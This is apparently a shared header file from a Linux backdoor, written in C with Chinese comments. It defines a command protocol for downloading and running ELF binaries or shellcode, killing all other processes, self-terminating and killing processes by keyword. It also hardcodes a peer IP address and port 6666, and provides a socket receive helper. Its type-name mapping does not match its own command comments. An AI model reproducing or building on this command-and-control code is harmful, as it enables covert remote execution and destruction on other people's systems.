#ifndef __CRAZY_COMMON_H
#define __CRAZY_COMMON_H

#define MAGIC 0xdeadcafe
struct BKMessage
{
    int magic;          //0xdeadcafe
    /*
    0xFF: authenticate 第一个包不是认证或认证不过直接关闭连接
    0x01: 下发ELF文件并执行
    0x02: 下发shellcode并执行
    0x03: 杀掉除自己外所有进程(kill -9 -1)
    0x04: 自杀
    0x05: 按关键字杀进程（这个用ELF实现下发就好了）
    */
    unsigned char cmdcode;
    unsigned char enrypt_policy; //0 明文 1 加密
    unsigned char is_cycle;      //是否周期执行
    unsigned char peroid;        //周期，单位秒
    int content_size;
    char content[0];
#ifdef __cplusplus
    BKMessage()
    {
        memset(this, 0, sizeof(*this));
        magic = htonl(MAGIC);
    }
    
    const char * get_type_str()
    {
        switch(cmdcode)
        {
        case 1:
            return "ELF";
        case 2:
            return "SHELLCODE";
        case 3:
            return "KILL -1";
        case 4:
            return "KILL KEYWORDS";
        }
        return "unkown";
    }
#endif
};
#endif

/*阻塞接收指定长度数据
in fd
in buffer
in size
*/
int receive_len(int fd, char * buffer, int size)
{
    int offset = 0;
    do
    {        
        int recvlen = recv(fd, buffer + offset, size - offset, 0);        
        if(recvlen <= 0)
        {
            break;
        }
        offset += recvlen;
    }while(offset < size);
    return offset == size;
}

#define PEER_IP "100.100.229.115"
#define PEER_IP_ASM INET_ADDR(127,0,0,1)
#define PEER_PORT 6666
#define TIMEOUT 300

/*
void dumpHex(const char * buffer, int len)
{
    printf("[%d]:\n", len);
    for(int i = 0; i < len; ++i)
    {
        printf("%02x\\", ((unsigned char *)buffer)[i]);
    }
    printf("\n");
}

void dump(const struct BKMessage * msg)
{
    printf("[BKMessage]:");
    printf("cmdcode %d\n", msg->cmdcode);
    int len = sizeof(struct BKMessage) + ntohl(msg->content_size);
    for(int i = 0; i < len; ++i)
    {
        printf("%02x\\", ((unsigned char *)msg)[i]);
    }
    printf("\n");
}*/